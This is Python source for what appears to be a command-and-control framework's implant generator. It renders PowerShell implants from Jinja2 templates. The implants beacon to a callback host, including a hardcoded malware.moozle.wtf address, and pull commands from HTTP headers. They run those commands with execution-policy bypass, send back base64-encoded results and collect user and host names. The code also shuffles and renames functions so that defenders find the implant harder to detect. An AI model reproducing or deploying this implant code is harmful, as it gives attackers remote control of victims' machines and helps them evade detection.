import jinja2
from random import shuffle

# -- Decorator Function Template
def RandomiseFudgeFunctions(decorated_function):
    def decor_randomised_jinja_template(*args, **kwargs):
        print("::",*args)
        randomised_jinja_template = ImplantGenerator.Generate_Function(ImplantGenerator())
        return decorated_function(*args, randomised_jinja_template)
    return decor_randomised_jinja_template


class ImplantGenerator():
    # -- This is a breakdown of the JinjaFudge which includes random jinja variables
    JinjaRandomisedArgs = {"blah": "aaaaaa"}
    play_audio = '''
function RemotePlayAudio {
    $args[0]
}
            '''
    fde_func_a = '''
function aaaaaa() {}
    '''
    fde_func_b = '''
function bbbbbb(){
    $hostN = hostname
    $final_str = $env:UserName+"::"+$hostN
    $Script:tr = $final_str
    write-output $Script:tr
}
    '''

    update_implant = '''
function JfaSlt ($a) {
    $b=($a -split "::")
    if ($b -Like " sys_info") {
        write-output "collecting sys_info"
        bbbbbb(0)
    } else {
        Write-Output $b
    }
}
        '''
    random_function = '''
function {{ ron.blah }} () {}
        '''
    http_function = '''
function http-connection(){
    $Body =  @{username='me';moredata='qwerty'}
    $headers = @{}
    $headers.Add("X-Implant","{{ uii }}")
    try {
        $URL = "http://"+$sgep+":{{ http_port }}/index"
        $LoginResponse = Invoke-WebRequest $URL -Headers $headers -Body $Body -Method 'POST'
        Write-Output $LoginResponse.Headers['X-Command']
    }
    catch {
        write-output "=="
    }
    return
    
}
    '''

    https_function = '''
function https-connection(){
    try {
        $URL = "https://"+$sgep+":{{ https_port }}/index"
        $kk = [System.Net.WebRequest]::Create($URL);
        $kk.Method = "POST"
        $kk.Headers.Add("X-Implant","{{ uii }}")
        $kk.Timeout = 10000;
        $LoginResponse = $kk.GetResponse()
        $LoginResponse.Close()
        Write-Output $LoginResponse.Headers["X-Command"]
        
    }
    catch {
        write-output "=="
    }
    return
}
    '''

    text = '''
    $sleep={{ beacon }}
    # $wc = New-Object System.Net.WebClient
    while($true){
        start-sleep($sleep)
        $headers = @{}
        $headers.Add("X-Implant","{{ uii }}")
        try {
            $LoginResponse = Invoke-WebRequest '{{ http }}://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST'
        }
        catch {
            $_.Exception | format-list -Force
        }      
        $headers = $LoginResponse.Headers["X-Command"]
        if ( $headers -NotLike "=="){
            write-output $headers
            if ( $headers.Substring(0,2) -Like "::") {
                JfaSlt($headers)
            } else {
                $tr = powershell.exe -exec bypass -C "$headers"
            }
            # -- If command issued this is the pre-return processing.
            $atr = $tr-join "`n"
            $gtr="{{ uii }}::$atr"
            $headers = @{}
            $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
            $headers.Add("X-Result",$b64tr)
            $LoginResponse = Invoke-WebRequest '{{ http }}://{{ url }}:{{ port }}/help' -Headers $headers -Body $Body -Method 'POST'           
        }
    }
    '''

    text_new ='''
$sleep={{ beacon }}
$sgep = "{{url}}"
while($true){
    start-sleep($sleep)
    try {

        {{ proto_core }}
    }
    catch {
        $_.Exception | format-list -Force
    }
    # Write-Output "$headers"
    if ( $headers -NotLike "=="){
        write-output "Non-sleep value"
        if ( $headers.Substring(0,2) -Like "::") {
            JfaSlt($headers)
        } else {
            $tr = powershell.exe -exec bypass -C "$headers"
        }
        # -- If command issued this is the pre-return processing.
        $atr = $tr-join "`n"
        $gtr="{{ uii }}::$atr"
        Write-Output $gtr
        $headers = @{}
        $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
        $headers.Add("X-Result",$b64tr)
        $LoginResponse = Invoke-WebRequest 'http://malware.moozle.wtf:5000/help' -Headers $headers -Body $Body -Method 'POST'
    }
}
    '''

    def Generate_Function(self, a):
        # TODO: Improve code quality

        #a = [self.play_audio, self.random_function, self.update_implant, self.fde_func_a, self.fde_func_b]
        # -- reorder functions
        shuffle(a)
        rjif = ""
        for x in a:
            rjif = rjif + x
        rjif = rjif + self.text_new
        return rjif


    def randomise_jinja_variables(self, JinjaRandomisedArgs):
        print("Randomising Jinja2 Variables")
        # TODO: Complete for level 0 obfuscation
        # -- Iterate over all variables contained within self.JinjaRandomisedArgs and replace the value
        # --    ensure that all variable values are unqiue.
        return JinjaRandomisedArgs

    # -- Public Functions
    @RandomiseFudgeFunctions
    def render_implant_(self, JinjaArg, RandomisedJinjaTemplate):
        JinjaArgs = JinjaArg[0]
        JRA = None
        # -- TODO: Improve obfuscation for consistency.
        print(JinjaArgs)
        if 'obfuscation_level' in JinjaArgs:
            if JinjaArgs['obfuscation_level'] >= 0:
                # -- Takes the JinjaRandomisedArgs(JRA) as a based templates, and returns a randomised dictionary
                # This never edits JinjaRandomisedArgs, as this will result in other instansatied    objects using randomised args
                #   which will make Fudge harder to detected in for experience teams.
                JRA = self.randomise_jinja_variables(self.JinjaRandomisedArgs)
            else:
                print("this state cannot exist")
        else:
            JRA = self.JinjaRandomisedArgs
        cc = jinja2.Template(RandomisedJinjaTemplate)

        # TODO: check each protocol where != 0 & doubled int etc
        if JinjaArgs['comms_https'] == 1:
            http_proto = "https"

        else:
            http_proto = "http"

        core_protocol_selection ='''
        
        '''
        output_from_parsed_template = cc.render(http=http_proto, url=JinjaArgs['callback_url'], port=JinjaArgs['port'], uii=JinjaArgs['unique_implant_id'], ron=JRA, beacon=JinjaArgs['beacon'])
        return output_from_parsed_template

    def __process_modules(self, id):
        # --  New in Tauren Herbalist
        a = [self.play_audio, self.random_function, self.update_implant, self.fde_func_a, self.fde_func_b]
        if id['comms_http'] != None:
            a.append(self.http_function)
        if id['comms_https'] != None:
            a.append(self.https_function)
        # TODO: Implement
        # if id['comms_dns'] != None:
        #     a.append(self.https_function)
        # if id['comms_binary'] != None:
        #     a.append(self.https_function)
        bb = self.Generate_Function(a)
        string = ""
        proto_count = 0
        proto_list = {'comms_http':'http-connection; Write-Output "http conn"','comms_https':'https-connection; Write-Output "https conn"','comms_dns':'dns-connection'}
        for x in proto_list.keys():
            if id[x] != None:

                string = string + str(proto_count)+" { "+proto_list[x]+" }\n"
                proto_count += 1
        print(string)
        f_str = ' switch ( get-random('+str(proto_count)+') ){ \n'+string+' }'
        print(f_str)
        return bb, f_str


    def _render_new(self, implant_data):
        # --  New in Tauren Herbalist
        a,b = self.__process_modules(implant_data[0])
        #print(a)
        #print(b)

        cc = jinja2.Template(a)
        implant_data = implant_data[0]
        output_from_parsed_template = cc.render(
            http=12345,
            url=implant_data['callback_url'],
            http_port=implant_data['comms_http'],
            https_port=implant_data['comms_https'],
            dns_port=implant_data['comms_dns'],
            uii=implant_data['unique_implant_id'],
            ron=self.JinjaRandomisedArgs,
            beacon=implant_data['beacon'],
            proto_core = b
        )
        return output_from_parsed_template